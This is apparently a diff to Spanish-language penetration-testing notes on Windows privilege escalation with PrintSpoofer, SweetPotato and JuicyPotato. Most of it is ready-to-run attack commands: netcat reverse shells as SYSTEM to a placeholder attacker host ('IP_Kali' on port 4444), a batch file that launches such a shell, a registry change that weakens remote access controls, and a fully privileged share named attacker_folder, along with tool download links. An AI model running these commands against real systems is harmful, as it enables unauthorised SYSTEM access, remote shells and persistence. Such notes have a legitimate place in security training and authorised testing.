@@ -152,7 +152,28 @@ PASOS con 'PrintSpoofer64' para ejecuta una Reverse Shell:
 ❯ https://github.com/itm4n/PrintSpoofer/releases   
 ❯ https://eternallybored.org/misc/netcat/
 
-❯ .\PrintSpoofer64.exe -c "cmd /c C:\Windows\Temp\nc.exe IP_Kali 4444 -e cmd"
+❯ .\PrintSpoofer64.exe -c "cmd /c C:\Temp\nc.exe IP_Kali 4444 -e cmd"
+# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
+
+o
+
+# Opción 2 - Elevar en la misma sesión 
+❯ .\PrintSpoofer64.exe -c powershell.exe -i
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# USAR SweetPotato para Windows 7 a Windows 10 / Server 2019
+
+PASOS con 'SweetPotato' para ejecuta una Reverse Shell:
+# Descargar PrintSpoofer64, Netcat y transferirlos a la máquina Windows en 'C:\Windows\Temp\'
+❯ https://github.com/CCob/SweetPotato   
+❯ https://eternallybored.org/misc/netcat/
+
+Paso 1:
+# Crear un .bat 
+❯ echo C:\Temp\nc.exe -e cmd.exe IP_Kali 4444 > test.bat
+
+❯ .\SweetPotato.exe -p test.bat 
 # Ejecutar un comando como nt authority \system para hacer una Reverse shell 
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -192,7 +213,7 @@ PASOS con 'JuicyPotato' para crear un usuario y tener persistencia:
 
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 # Opcional en caso de que no deje ingresar y necesite el recurso compartido
-❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Temp /GRANT:Administrators,FULL" -l 1337  
 
 
 Notas:
@@ -208,7 +229,7 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 ❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    
 ❯ https://eternallybored.org/misc/netcat/
 
-❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 4444"
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe -e cmd IP_Kali 4444"
 ```
 
 
